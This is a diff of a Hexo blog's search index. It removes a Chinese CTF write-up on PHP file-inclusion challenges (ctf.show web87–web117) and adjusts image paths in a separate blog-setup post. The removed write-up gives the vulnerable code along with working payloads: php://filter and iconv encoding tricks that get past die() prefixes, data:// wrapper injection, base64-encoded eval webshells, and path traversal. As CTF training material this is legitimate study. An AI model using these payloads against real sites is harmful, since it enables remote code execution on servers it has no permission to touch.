class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">session_start();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<p>然后抓包，加一下<code>PHPSESSID</code>，在送去爆破就可以了</p>
-<p>方法没有做出来。</p>
-<h1 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 21:57:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<p>die 函数 等同于 exit()：exit 函数输出一个消息并且退出当前脚本。脚本会我们传入的content参数中加入die，从而让我们无法利用写入的一句话木马。</p>
-<p>存在urldecode（）函数，我们需要进行URL编码</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">php://filter/convert.base64-decode/resource=1.php</span><br><span class="line">进行URL全编码</span><br><span class="line">？file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-<p>一句话木马</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[pass]);?&gt;</span><br><span class="line">写成</span><br><span class="line">之所以加上nb，是因为要把不需要的代码给解码掉，是前面剩下phpdie，一共6个字符，所以需要再加2个字符变8个</span><br><span class="line">content=nbPD9waHAgQGV2YWwoJF9QT1NUW3Bhc3NdKTs/Pg==</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-<p>将此传上去，就可以成功了</p>
-<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_9.png"></p>
-<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/image_9.png" class title="This is an image">
-
-<h1 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-17 02:27:25</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<p>直接改变之前的代码了，就过滤了php，还有过滤了一些符号。</p>
-<h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><p>data：&#x2F;&#x2F; 伪协议</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:text/plain,<span class="meta">&lt;?</span>PHP <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat fla*&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<p>进行base64编码，记住去除等号</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//db7b5767-69bb-4227-a74f-12e3e60bbed1.challenge.ctf.show/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKicpOw</span></span><br></pre></td></tr></table></figure>
-
-
-<h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><p>传入一句话木马</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:text/plain,<span class="meta">&lt;?</span>PHP @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<p>进行base64编码，</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9QSFAgQGV2YWwoJF9QT1NUWydzaGVsbCddKTs/Pg==</span></span><br></pre></td></tr></table></figure>
-
-
-<p>传上直接getshell</p>
-<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_10.png" alt="image_10"></p>
-<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/image_10.png" class title="This is an image">
-
-<h1 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h1><p>misc+lfi</p>
-<p>就是一道misc题目吧</p>
-<p>进去是一短视</p>
-<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_11.png"></p>
-<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/image_11.png" class title="This is an image">
-
-<p>好怀念的说</p>
-<p>直接使用file伪协议</p>
-<p>开始我使用常用的，没有回显，我就是只剩下flag.php，就出来了。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=/../../../../../../flag.php</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_12.png"></p>
-<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/image_12.png" class title="This is an image">
-
-<h1 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: yu22x</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-01 18:16:59</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>);</span><br></pre></td></tr></table></figure>
-
-
-<p>又是要绕过死亡die，把常用都禁用了，在官网上有其他的</p>
-<p><a href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">PHP支持的编码方式</a></p>
-<p>UCS-2LE UCS-2BE编码</p>
-<p>测试代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>, <span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;);</span></span><br><span class="line"><span class="string">echo &quot;经过一次反转:&quot;.$result.&quot;\n&quot;;</span></span><br><span class="line"><span class="string">echo &quot;经过第二次反转:&quot;.iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;, $result);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<p>本来想用4的试试，但是php die 不满足条件。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">file=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span></span><br><span class="line">post:</span><br><span class="line">contents=?&lt;hp pvela$(P_SO[T]<span class="number">1</span>;)&gt;?</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="/../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_13.png"></p>
-<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/image_13.png" class title="This is an image">
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>文件包含</tag>
-        <tag>练习题</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>本博客搭建的记录(持续更新)</title>
     <url>/2022/%E6%9C%AC%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E7%9A%84%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本站点是由<code>Hexo+NexT</code>主题搭建起来的，本文章就是想记录一下网站的搭建，以及整理一下自己的思路。希望能够给初手提供一些小小的帮助。</p>
@@ -1115,7 +1115,7 @@
 <p>解析线路，境外或谷歌。</p>
 </li>
 </ol>
-<p><img src="/image-20220301145249034.png"></p>
+<p><img src="/2022/%E6%9C%AC%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E7%9A%84%E8%AE%B0%E5%BD%95/image-20220301145249034.png"></p>
 
 
 <p>A记录类型的记录值为<strong>IPV4</strong>地址，通过ping域名得到</p>
@@ -1126,7 +1126,7 @@
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>
 
 <p>在 <strong>Github</strong> 查看 <strong>CNAME</strong> 文件以及网址。</p>
-<p><img src="/image-20220301150035702.png"></p>
+<p><img src="/2022/%E6%9C%AC%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E7%9A%84%E8%AE%B0%E5%BD%95/image-20220301150035702.png"></p>
 
 
 <p>输入域名就可以直接登录网站了。</p>
